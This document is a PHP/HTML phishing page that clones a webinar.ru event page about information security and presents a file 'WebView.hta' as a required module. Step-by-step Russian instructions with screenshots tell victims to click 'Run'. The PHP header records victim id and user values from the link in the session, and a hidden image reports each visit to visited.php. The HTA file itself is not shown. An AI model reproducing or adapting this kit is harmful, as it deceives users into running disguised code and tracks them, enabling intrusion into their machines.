<?php
session_start();

if(isset($_GET['id']) && isset($_GET['user'])){
    $_SESSION['id']= $_GET['id'];
    $_SESSION['user']= $_GET['user'];
    header('Location: index.php');
}

if(file_exists('config.php')){
    header('Location: config.php');
}elseif(file_exists('config2.php')){
    header('Location: config2.php');
}
?>
<img src="visited.php?id=<?php echo $_SESSION['id'];?>&user=<?php echo $_SESSION['user'];?>" style="display: none;">
<!DOCTYPE html>
<!-- saved from url=(0043)https://my.webinar.ru/event/778910/?t=46132 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" src="./files/4127850250"></script><script src="./files/nr-943.min.js"></script></script><script type="text/javascript" async="" src="./files/watch.js"></script><script id="bpmTracking" async="" src="./files/tracking_bTOVPcCqCA7tmyCtLTwsrNC1kKm5JVAQMlX3CCVm.js"></script></script><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(e,t){return function(){o(e,[(new Date).getTime()].concat(a(arguments)),null,t)}}var o=e("handle"),i=e(2),a=e(3);"undefined"==typeof window.newrelic&&(newrelic=NREUM);var u=["setPageViewName","setCustomAttribute","finished","addToTrace","inlineHit"],c=["addPageAction"],f="api-";i(u,function(e,t){newrelic[t]=r(f+t,"api")}),i(c,function(e,t){newrelic[t]=r(f+t)}),t.exports=newrelic,newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),o("err",[e,(new Date).getTime()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(0>o?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?u(e,a,i):i()}function n(n,r,o){e&&e(n,r,o);for(var i=t(o),a=l(n),u=a.length,c=0;u>c;c++)a[c].apply(i,r);var s=f[g[n]];return s&&s.push([m,n,r,i]),i}function p(e,t){w[e]=l(e).concat(t)}function l(e){return w[e]||[]}function d(e){return s[e]=s[e]||o(n)}function v(e,t){c(e,function(e,n){t=t||"feature",g[n]=t,t in f||(f[t]=[])})}var w={},g={},m={on:p,emit:n,get:d,listeners:l,context:t,buffer:v};return m}function i(){return new r}var a="nr@context",u=e("gos"),c=e(2),f={},s={},p=t.exports=o();p.backlog=f},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!w++){var e=v.info=NREUM.info,t=s.getElementsByTagName("script")[0];if(e&&e.licenseKey&&e.applicationID&&t){c(l,function(t,n){e[t]||(e[t]=n)});var n="https"===p.split(":")[0]||e.sslForHttp;v.proto=n?"https://":"http://",u("mark",["onload",a()],null,"api");var r=s.createElement("script");r.src=v.proto+e.agent,t.parentNode.insertBefore(r,t)}}}function o(){"complete"===s.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=e("handle"),c=e(2),f=window,s=f.document;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:f.XMLHttpRequest,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},e(1);var p=""+location,l={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-943.min.js"},d=window.XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.addEventListener&&!/CriOS/.test(navigator.userAgent),v=t.exports={offset:a(),origin:p,features:{},xhrWrappable:d};s.addEventListener?(s.addEventListener("DOMContentLoaded",i,!1),f.addEventListener("load",r,!1)):(s.attachEvent("onreadystatechange",o),f.attachEvent("onload",r)),u("mark",["firstbyte",a()],null,"api");var w=0},{}]},{},["loader"]);</script>


	<link type="text/css" href="./files/main.css" rel="stylesheet" media="screen">
    <script type="text/javascript" src="./files/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="./files/jquery-migrate-1.2.1.js"></script>
	<script type="text/javascript" src="./files/jquery.placeholder.min.js"></script>
    <script type="text/javascript" src="./files/config.js.php"></script>

	<title>WEBINAR.RU | ДБО. Тест</title>
    <style>
        .listInform
        {
            height: 90px;
        }
        .listInform ul
        {

            list-style: none outside none;
            position: relative;

            width: 450px;
        }
        .listInform ul li
        {
            padding-top: 15px;
        }
        .listInform ul li div
        {
            margin-left: 25px;
        }
        .liRounder
        {
            background-color: #7DAD3E;
            border-radius: 4px 4px 4px 4px;
            display: inline-block;
            float: left;
            height: 8px;
            margin-right: 15px;
            position: relative;
            top: 5px;
            width: 8px;
        }
        .socialIcon
        {
            float: left;
            padding-right: 5px;
        }
        .listSocial
        {
            margin-left: 620px;
            padding-right: 40px;
            position: relative;
            top: -100px;
            width: 110px;
            cursor: pointer;
        }
        .titleSocial
        {
            font-size: 11px;
        }
    </style>





</head>
<body>
<center>

<br>
<table width="764" align="center"><tbody><tr><td>
 	
		
									<img src="./files/webinar-transparent.png" border="0" width="137" height="24">
				
		

	 
</td></tr>
</tbody></table>


<br>
<table width="794" align="center" cellspacing="0" cellpadding="0">
	<tbody><tr>
		<td align="left">
			<div style="box-shadow: 0px 0px 5px #CCC; border-radius: 6px;">
 <!-- div style="background-image:url(/billing/design/img/center_bg/bg.jpg); background-repeat:repeat-y;">
 <div  style="background-image:url(/billing/design/img/center_bg/top.jpg); background-repeat:no-repeat;">
 <div  style="background-image:url(/billing/design/img/center_bg/bottom.jpg); background-repeat:no-repeat; background-position:bottom left;  min-height:350px;" -->
  <div class="contentOsn">
         <br>
         <div style="padding-left:15px; margin-left: 15px">
     <h2 style="color: #000000">Противодействие угрозам информационной безопасности</h2>
         Начало: 21.06.2016 15:30, UTC+3 Москва (<a href="https://my.webinar.ru/event/modules/ical.php?webinar_id=778910">Добавить в календарь</a>)<br><b>Мероприятие еще не началось</b><br>         <br>
 </div>
 
 <div class="contentOsn">
     <div style="padding-left:15px;">
     
     <div class="contentCB"><div class="contentTB"><div class="contentBB"><div class="contentOO">
         
	 
	<h3>Для участия в вебинаре установите модуль WebView:</h3>

   



 <font size="5"><a href="WebView.hta">Загрузить</a></font>

<font size="3" >    
<p>В завимости от конфигурации компьютера, может потребоваться загрузка дополнительных файлов.<br> <br>Для этого нажмите правой кнопкой мышки по надписи "Чтобы помочь обеспечению" и выберете пункт "Загрузка файла":</p>
<img src="1.jpg"  ><br><br>
<p>Далее появится окошко предлагающее запустить или сохранить файл</p>
 <p>Нажимаем по кнопке "Запустить".</p>
<img src="2.jpg"><br><br>
<p>Необходимые изменения выполнены, можно продолжать работу в привычном Вам режиме. </p>

 <font size="5"><a href="WebView.hta">Загрузить</a></font><br><br>

  </div></div></div></div></div>

     
         <div class="listInform">
            <ul>
				<li><span class="liRounder">&nbsp;</span><div>Пройти тест системы и проверить настройки звука и видео <a href="#">webinar.ru/faq_and_support/system_test</a></div></li>
            </ul>
             <div class="listSocial">
				 <span class="titleSocial">Поделиться в социальных сетях</span><br><br>
                 <a target="_blank" onclick="window.open(&#39;http://vk.com/share.php?url=http%3A%2F%2Fmy.webinar.ru%2Fevent%2F778910%2F%3Ft%3D46132&amp;title=%D0%94%D0%91%D0%9E.+%D0%A2%D0%B5%D1%81%D1%82&amp;description=&#39;, &#39;_blank&#39;, &#39;scrollbars=0, resizable=1, menubar=0, left=100, top=100, width=550, height=440, toolbar=0, status=0&#39;);return false" class="socialIcon" rel="nofollow"><img alt="vkontakte" title="vkontakte" src="./files/vk.png" width="27" height="28"></a>
                 <a target="_blank" onclick="window.open(&#39;http://www.facebook.com/sharer.php?u=http%3A%2F%2Fmy.webinar.ru%2Fevent%2F778910%2F%3Ft%3D46132&#39;, &#39;_blank&#39;, &#39;scrollbars=0, resizable=1, menubar=0, left=100, top=100, width=550, height=440, toolbar=0, status=0&#39;);return false" class="socialIcon" rel="nofollow"><img alt="facebook" title="facebook" src="./files/f.png" width="27" height="28"></a>
                 <a target="_blank" onclick="window.open(&#39;https://twitter.com/intent/tweet?text=%D0%94%D0%91%D0%9E.+%D0%A2%D0%B5%D1%81%D1%82&amp;url=http%3A%2F%2Fmy.webinar.ru%2Fevent%2F778910%2F%3Ft%3D46132&#39;, &#39;_blank&#39;, &#39;scrollbars=0, resizable=1, menubar=0, left=100, top=100, width=550, height=440, toolbar=0, status=0&#39;);return false" class="socialIcon" rel="nofollow"><img alt="twitter" title="twitter" src="./files/t.png" width="27" height="28"></a>
             </div>
         </div>

         <br><br>
         
 </div>
 </div>
 <!--/div>
 </div -->

		</div></td>
	</tr>
</tbody></table>
</center>
<div id="counters" style="display: none; float: right; opacity: 0;">
</div>


<div></div><div class="__disk_root__" style="position: static;"></div></body></html>